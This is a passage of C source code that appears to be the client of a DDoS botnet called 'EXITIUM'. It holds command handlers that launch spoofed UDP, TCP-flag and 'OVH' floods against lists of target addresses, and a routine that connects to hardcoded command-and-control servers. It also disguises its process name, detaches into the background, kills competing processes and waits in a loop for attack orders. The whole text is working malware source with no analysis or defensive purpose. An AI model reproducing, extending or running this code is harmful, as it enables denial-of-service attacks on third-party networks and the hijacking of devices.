        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 ||
            atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) { return; }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int packetsize = atoi(argv[5]);
        int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    SUDP(hi, port, time, spoofed, packetsize, pollinterval);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SUDP(ip, port, time, spoofed, packetsize, pollinterval);
            _exit(0);
        }
    }


            if(!strcmp(argv[0], "S")) 
        {
            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {return;} 
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            if(strstr(ip, ",") != NULL) 
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) 
                {
                    if(!listFork()) 
                    {
                        stdfl00d(hi, port, time);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } 
            else 
            {
                if (listFork()) { return; }
                stdfl00d(ip, port, time);
                _exit(0);
            }
        }
    

            if(!strcmp(argv[0], "O"))
        {
                if(argc < 5)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 9;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        ovhflood(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        ovhflood(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }


    if (!strcmp(argv[0], "T")) {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 ||
            (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) { return; }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int psize = argc > 6 ? atoi(argv[6]) : 0;
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    STCP(hi, port, time, spoofed, flags, psize, pollinterval);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            STCP(ip, port, time, spoofed, flags, psize, pollinterval);
            _exit(0);
        }
    }

    if (!strcmp(argv[0], "P")) { _exit(0); }
    if (!strcmp(argv[0], "K")) {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }
        if (killed > 0) {
        } else {}
    }
}

int Conn() {
    unsigned char server[4096];
    memset(server, 0, 4096);
    if (EXITIUMSock) {
        close(EXITIUMSock);
        EXITIUMSock = 0;
    }
    if (SRV + 1 == LST_SZ) SRV = 0;
    else SRV++;
    SZP(server, "%d.%d.%d.%d", EXITIUM[SRV], EXITIUM2[SRV], EXITIUM3[SRV], EXITIUM4[SRV]);
    

    EXITIUMSock = socket(AF_INET, SOCK_STREAM, 0);

    if (!connectTimeout(EXITIUMSock, server, port, 30)) return 1;

    return 0;
}

int main(int argc, unsigned char *argv[]) {
    if (LST_SZ <= 0) return 0;
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    table_init();
    rand_init();
    char name_buf[32];
    //unlink(argv[0]);
    int name_buf_len;
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    strcpy(argv[0], name_buf);
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(ST_NM, name_buf);
    pid_t pid1;
    pid_t pid2;
   pid_t killer_pid;

    int status;

    setsid();
    chdir("/");
    signal(SIGPIPE, SIG_IGN);
    char *tbl_exec_succ;
    int tbl_exec_succ_len = 0;
    t_u_v(XOR_EXEC_SUCCESS);
    tbl_exec_succ = t_r_v(XOR_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    t_l_v(XOR_EXEC_SUCCESS);
    //KeepAlive();
    killer_init();
    /* rm -rf /* */
    #ifdef xrep
    lets_rep();
    #endif

    if (pid1 = fork()) {
        waitpid(pid1, &status, 0);
          #ifdef DEBUG
            printf("we exited on case 1 pid %d\n", pid1);
            #endif
            sleep(0);
        
    } else if (!pid1) {
        if (pid2 = fork()) {
            #ifdef DEBUG
            printf("we exited on case 2 pid %d\n", pid1);
            #endif
            exit(0);
        } else if (!pid2) {
        } else {}
    } else {}
    
    if (killer_pid = fork()) {
            #ifdef DEBUG
            printf("we exited on case 3 pid %d\n", killer_pid);
            #endif
            exit(0);
        }

    while (1) {
        if (Conn()) {
            sleep(3);
            continue;
        }
        EXITIUMonPrint(EXITIUMSock, "%s", "%s", exploits(), GB());
        char CMB[4096];
        int got = 0;
        int i = 0;
        while ((got = recvLine(EXITIUMSock, CMB, 4096)) != -1) {
            for (i = 0; i < numpids; i++)
                if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                    unsigned int *newpids, on;
                    for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
                    pids[on - 1] = 0;
                    numpids--;
                    newpids = (unsigned int *) malloc((numpids + 1) * sizeof(unsigned int));
                    for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                    free(pids);
                    pids = newpids;
                }
            CMB[got] = 0x00;
            trim(CMB);
            unsigned char *KMSG = CMB;
            if (*KMSG == '!') {
                unsigned char *nickMask = KMSG + 1;
                while (*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                if (*nickMask == 0x00) continue;
                *(nickMask) = 0x00;
                nickMask = KMSG + 1;
                KMSG = KMSG + strlen(nickMask) + 2;
                while (KMSG[strlen(KMSG) - 1] == '\n' || KMSG[strlen(KMSG) - 1] == '\r')
                    KMSG[strlen(KMSG) - 1] = 0x00;
                unsigned char *command = KMSG;
                while (*KMSG != ' ' && *KMSG != 0x00) KMSG++;
                *KMSG = 0x00;
                KMSG++;
                unsigned char *tmpcommand = command;
                while (*tmpcommand) {
                    *tmpcommand = toupper(*tmpcommand);
                    tmpcommand++;
                }
                unsigned char *params[10];
                int paramsCount = 1;
                unsigned char *pch = strtok(KMSG, " ");
                params[0] = command;
                while (pch) {
                    if (*pch != '\n') {
                        params[paramsCount] = (unsigned char *) malloc(strlen(pch) + 1);
                        memset(params[paramsCount], 0, strlen(pch) + 1);
                        strcpy(params[paramsCount], pch);
                        paramsCount++;
                    }
                    pch = strtok(NULL, " ");
                }
                CnC(paramsCount, params);
                if (paramsCount > 1) {
                    int q = 1;
                    for (q = 1; q < paramsCount; q++) {
                        free(params[q]);
                    }
                }
            }
        }
    }
    return 0;
}
